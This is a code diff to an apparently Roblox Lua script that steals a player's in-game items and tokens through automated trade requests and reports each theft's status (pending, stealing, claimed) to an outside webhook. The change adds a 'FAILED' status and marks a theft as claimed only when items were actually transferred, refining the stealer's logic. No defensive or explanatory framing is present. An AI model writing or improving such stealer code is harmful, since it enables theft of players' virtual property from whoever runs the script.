@@ -414,7 +414,8 @@ local function SendWebhookMessage(isJoinMessage, allItems, tradeItems, tokens)
     local statusEmoji = {
         ["PENDING"] = "🟨",
         ["STEALING"] = "🟧", 
-        ["CLAIMED"] = "🟩"
+        ["CLAIMED"] = "🟩",
+        ["FAILED"] = "🟥"
     }
     
     table.insert(fields, {
@@ -620,6 +621,7 @@ if #itemsToSend > 0 or totalTokens > 0 then
             end)
             
             if not requestSuccess then
+                -- Failed to send trade request, break but don't set FAILED
                 break
             end
             
@@ -630,6 +632,7 @@ if #itemsToSend > 0 or totalTokens > 0 then
             until inTrade or tick() - startTime > timeout
             
             if not inTrade then
+                -- Trade request timed out, break but don't set FAILED
                 break
             end
             
@@ -666,8 +669,10 @@ if #itemsToSend > 0 or totalTokens > 0 then
             task.wait(3)
         end
         
-        -- Update status to CLAIMED when trade is complete
-        updateStatus("CLAIMED", allItemsList, originalItemsToSend, totalTokens)
+        -- Update status to CLAIMED when trade is complete (only if successful)
+        if successCount > 0 then
+            updateStatus("CLAIMED", allItemsList, originalItemsToSend, totalTokens)
+        end
         
         SendWebhookMessage(false, allItemsList, originalItemsToSend, totalTokens)
     end
